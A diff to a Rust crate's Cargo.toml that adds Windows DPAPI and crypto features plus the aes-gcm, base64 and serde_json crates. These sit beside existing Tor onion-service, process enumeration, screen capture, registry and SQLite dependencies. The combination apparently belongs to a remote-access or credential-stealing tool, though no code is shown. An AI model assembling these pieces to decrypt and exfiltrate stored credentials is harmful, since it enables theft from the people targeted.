@@ -4,7 +4,7 @@ version = "0.1.0"
 edition = "2021"
 
 [dependencies]
-winapi = { version = "0.3.9", features = ["libloaderapi", "tlhelp32", "utilapiset", "errhandlingapi", "dxgi1_2", "winerror", "synchapi", "securitybaseapi", "winuser", "wincon","shellapi", "oleauto"] }
+winapi = { version = "0.3.9", features = ["libloaderapi", "tlhelp32", "utilapiset", "errhandlingapi", "dxgi1_2", "winerror", "synchapi", "securitybaseapi", "winuser", "wincon","shellapi", "oleauto", "dpapi", "wincrypt"] }
 sysinfo = { version = "0.35.0", default-features = false, features = ["system", "disk"] }
 common = { path = "../common" }
 rmp-serde = "1.3.0"
@@ -22,3 +22,6 @@ winreg = "0.55.0"
 arti-client = { version = "0.42.0", features = ["tokio", "rustls", "onion-service-client"] }
 tor-rtcompat = { version = "0.42.0", features = ["tokio", "rustls"] }
 rusqlite = { version = "0.36.0", features = ["bundled"] }
+aes-gcm = "0.10.3"
+base64 = "0.22.1"
+serde_json = "1.0"
